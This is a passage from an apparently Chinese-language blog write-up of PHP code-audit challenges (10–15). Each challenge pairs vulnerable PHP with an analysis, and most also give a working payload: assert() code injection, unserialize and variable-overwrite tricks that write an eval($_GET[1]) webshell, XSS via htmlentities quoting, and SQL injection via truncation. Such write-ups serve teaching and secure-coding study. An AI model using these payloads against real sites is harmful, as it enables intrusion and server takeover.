class="regexp">//</span>....<span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure><h2 id="10-Anticipation"><a href="#10-Anticipation" class="headerlink" title="10 - Anticipation"></a>10 - Anticipation</h2><blockquote><p>未正确 exit</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">    header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">    goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!assert(<span class="string">"(int)$pi == 3"</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>该代码的大致意思是输入一个 <code>pi</code>，验证是否为数字类型，非数字将重定向到错误页面。</p><p><code>assert()</code> RCE 可以参考这篇文章 <a href="https://www.cnblogs.com/sn00py/p/5925944.html" target="_blank" rel="noopener">assert引起的代码注射</a>，另外<code>extract()</code> 很容易引起变量覆盖。</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">pi=phpinfo()</span><br></pre></td></tr></table></figure><p>PS:这里的 <code>phpinfo</code> 不太好看到，写个 <code>webshell</code> 进去再看。</p><h2 id="11-Pumpkin-Pie"><a href="#11-Pumpkin-Pie" class="headerlink" title="11 - Pumpkin Pie"></a>11 - Pumpkin Pie</h2><blockquote><p>unserialize</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">            &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        file_put_contents($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p><code>createCache()</code> 里面有个 <code>file_put_contents()</code> 可以拿来写 <code>shell</code> ，再结合一下 <code>__destruct()</code> 构造反序列化漏洞来利用。</p><p><code>loadData()</code> 本意可能是想反序列化一个数组，有简单的过滤，但是<code>preg_match()</code> 这里的 <code>\</code> 写的有问题，造成正则匹配过滤失效。</p><p><strong>魔术方法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><ul><li>将对象放到数组里</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php eval($_GET[1]); ?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="keyword">new</span> Template);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// a:1:&#123;i:0;O:8:"Template":2:&#123;s:9:"cacheFile";s:9:"shell.php";s:8:"template";s:24:"<span class="meta">&lt;?php</span> eval($_GET[1]); <span class="meta">?&gt;</span>";&#125;&#125;</span></span><br><span class="line"><span class="comment">// 即可成功写入 shell.php</span></span><br></pre></td></tr></table></figure><ul><li>如果正则配置正确，<code>O:+8</code> 绕过 <a href="https://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">php反序列unserialize的一个小特性</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:<span class="number">8</span>:<span class="string">"Template"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"cacheFile"</span>;s:<span class="number">9</span>:<span class="string">"shell.php"</span>;s:<span class="number">8</span>:<span class="string">"template"</span>;s:<span class="number">24</span>:<span class="string">"&lt;?php eval($_GET[1]); ?&gt;"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="12-String-Lights"><a href="#12-String-Lights" class="headerlink" title="12 - String Lights"></a>12 - String Lights</h2><blockquote><p>htmlentities</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $key . <span class="string">'='</span> . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(<span class="string">'&amp;'</span>, $queryParts);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='/images/size.php?"</span> .</span><br><span class="line">    htmlentities($query) . <span class="string">"'&gt;link&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>先看一下这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">implode ( string $glue , <span class="keyword">array</span> $pieces ) : string</span><br><span class="line"><span class="comment">// 用 glue 将一维数组中的值拼接起来</span></span><br><span class="line">    </span><br><span class="line">htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(<span class="string">"default_charset"</span>) [, bool $double_encode = <span class="keyword">true</span> ]]] ) : string</span><br><span class="line"><span class="comment">// 将字符转换为 HTML 转义字符，也就是对一些特殊字符进行 HTML 实体编码</span></span><br><span class="line"><span class="comment">// 本函数各方面都和 htmlspecialchars() 一样， 除了 htmlentities() 会转换所有具有 HTML 实体字符</span></span><br></pre></td></tr></table></figure><p>上面的代码用的是 <code>htmlentities()</code> 的默认参数</p><blockquote><p><strong>ENT_COMPAT</strong>  | 会转换双引号，不转换单引号 </p><p><strong>ENT_HTML401</strong> | 以 HTML 4.01 处理代码</p></blockquote><p>也就是说，不会对单引号进行实体编码。</p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><p>可以构造一个事件去触发 xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">''</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">''</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果直接提交</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'onmouseover=alert</span>(<span class="name">1</span>)</span><br><span class="line"><span class="symbol">'onclick=alert</span>(<span class="name">1</span>)</span><br></pre></td></tr></table></figure><p>显然是不行的，<code>alert(1)</code> 将被 <code>intval</code> 掉，这时候可以将等号编码为 <code>%3D</code> ，然后再加个等号。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'onmouseover%3Dalert(1)//=1</span></span><br><span class="line"><span class="string">'</span>onclick%<span class="number">3</span>Dalert(<span class="number">1</span>)<span class="comment">//=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">[<span class="string">'onmouseover=alert(1)//] =&gt; 1</span></span><br><span class="line"><span class="string">    ['</span>onclick=alert(<span class="number">1</span>)<span class="comment">//] =&gt; 1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>最终形成的 <code>payload</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/images/size.php?'</span><span class="attr">onmouseover</span>=<span class="string">alert(1)//</span>=<span class="string">1</span>'&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/images/size.php?'</span><span class="attr">onclick</span>=<span class="string">alert(1)//</span>=<span class="string">1</span>'&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果可控点在 <code>href</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>==&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13-Turkey-Baster"><a href="#13-Turkey-Baster" class="headerlink" title="13 - Turkey Baster"></a>13 - Turkey Baster</h2><blockquote><p>截断惹的祸</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">        $pass = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">            -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">            -&gt;where(<span class="string">"user = '$user' AND password = '$pass'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        $input = addslashes($input);</span><br><span class="line">        <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">            $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> LoginManager($_POST[<span class="string">'user'</span>], $_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>注意到两个参数都被 <code>addslashes()</code> 转义，而且将被截断。</p><p>如果没有这个截断操作，有 <code>addslashes()</code> 加持还是会安全很多，有了截断就可以搞事情了，“逃逸”一个 <code>\</code> 出来将 <code>‘</code> 吃掉。</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span>\&amp;passwd=<span class="keyword">or</span> <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>形成的 <code>sql</code> 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where user = '1234567890123456789\' AND password = 'or 1<span class="comment">#'</span></span><br></pre></td></tr></table></figure><h2 id="14-Snowman"><a href="#14-Snowman" class="headerlink" title="14 - Snowman"></a>14 - Snowman</h2><blockquote><p>变量覆盖</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> EXTERNAL_DIRECTORY = <span class="string">'/tmp/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $id;</span><br><span class="line">    <span class="keyword">private</span> $lost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> $bought = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = rand(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $field =&gt; $count) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$field = $count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(</span><br><span class="line">            <span class="keyword">self</span>::EXTERNAL_DIRECTORY . <span class="keyword">$this</span>-&gt;id,</span><br><span class="line">            var_export(get_object_vars(<span class="keyword">$this</span>), <span class="keyword">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = <span class="keyword">new</span> Carrot($_GET);</span><br></pre></td></tr></table></figure><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>这里有一个明显的变量覆盖漏洞，<code>id</code> 尽管被赋上了随机数，但实际上还是可控的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents ( string $filename , mixed $data [, int $flags = <span class="number">0</span> [, resource $context ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>PHP 有个好玩的地方，能传 <code>$filename</code> 的地方，基本上可以用 PHP 伪协议流。</p><p>可惜这里的 EXTERNAL_DIRECTORY 不可控，不好用其他技巧了。</p><p>想深入了解可以参考 ph 师傅的这篇文章，<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p></blockquote><p><code>get_object_vars($this)</code> 没有采取任何过滤，可直接写入 <code>webshell</code>。</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">id=../../<span class="keyword">var</span>/www/html/shell.php&amp;t=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r(var_export(get_object_vars($this), true));   </span></span><br><span class="line"><span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'id'</span> =&gt; <span class="string">'../../var/www/html/shell.php'</span>,</span><br><span class="line">  <span class="string">'lost'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">  <span class="string">'bought'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">  <span class="string">'t'</span> =&gt; <span class="string">'&lt;?php eval($_GET[1])?&gt;'</span>,</span><br><span class="line">)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// echo self::EXTERNAL_DIRECTORY . $this-&gt;id;</span></span><br><span class="line">/tmp/../../<span class="keyword">var</span>/www/html/test/shell.php</span><br></pre></td></tr></table></figure><p><strong>变一变</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;$field = $count++;  -–&gt;  <span class="keyword">$this</span>-&gt;$field = ++$count;</span><br></pre></td></tr></table></figure><p>php 有个很有意思的特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $s = <span class="string">'1'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// 2</span></span><br><span class="line">php &gt; $s = <span class="string">'a'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// b</span></span><br><span class="line">php &gt; $s = <span class="string">'abc'</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> ++$s;  <span class="comment">// abd</span></span><br></pre></td></tr></table></figure><p>这时候只需要稍微改下即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../../<span class="keyword">var</span>/www/html/shell.pho&amp;t=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_GET[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="15-Sleigh-Ride"><a href="#15-Sleigh-Ride" class="headerlink" title="15 - Sleigh Ride"></a>15 - Sleigh Ride</h2><blockquote><p>$_SERVER[‘PHP_SELF’]</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $websiteHost = <span class="string">'www.example.com'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">        $url = urldecode($url);</span><br><span class="line">        header(<span class="string">"Location: $url"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">        $parts = explode(<span class="string">'/'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">        $baseFile = end($parts);</span><br><span class="line">        $url = sprintf(</span><br><span class="line">            <span class="string">"%s?%s"</span>,</span><br><span class="line">            $baseFile,</span><br><span class="line">            http_build_query($params)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setHeaders($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'redirect'</span>]) &#123;</span><br><span class="line">    (<span class="keyword">new</span> Redirect())-&gt;startRedirect($_GET[<span class="string">'params'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>粗一看，有一个 <code>Redirect</code> 的类，很有可能是任意 <code>URL</code> 跳转。</p><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'PHP_SELF'</span>]  <span class="comment">// 当前执行脚本的文件名</span></span><br><span class="line">http:<span class="comment">//example.com/test.php/foo.bar</span></span><br><span class="line">--&gt; /test.php/foo.bar</span><br><span class="line"></span><br><span class="line">explode ( string $delimiter , string $string [, int $limit ] ) : <span class="keyword">array</span></span><br><span 